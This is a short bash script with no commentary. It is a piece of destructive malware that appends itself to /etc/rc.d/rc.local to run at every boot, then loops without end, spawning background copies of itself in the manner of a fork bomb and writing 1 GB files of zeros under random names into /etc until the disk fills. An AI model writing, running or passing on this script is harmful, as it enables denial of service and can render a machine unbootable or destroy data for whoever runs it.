#!/bin/bash
cat /etc/rc.d/rc.local	| grep "$0" || echo $(pwd)"/"$0 >> /etc/rc.d/rc.local
while true
  do
#  chmod +x ./$0
  {
  ./$0 &>/dev/null
    }&
#  sleep 10
  md5seq=`echo $RANDOM | md5sum | cut -d " " -f1`
  dd if=/dev/zero of=/etc/$md5seq bs=1M count=1024
  done
  
